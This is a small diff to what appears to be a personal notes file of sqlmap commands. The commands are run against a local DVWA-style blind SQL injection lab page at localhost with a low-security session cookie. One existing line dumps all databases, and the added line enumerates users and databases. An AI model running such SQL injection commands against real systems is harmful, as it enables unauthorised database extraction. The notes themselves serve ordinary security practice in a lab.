@@ -23,3 +23,7 @@ python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&S
 
 
 python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --dump-all --batch --threads 5
+
+
+
+python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --users --dbs --threads 5
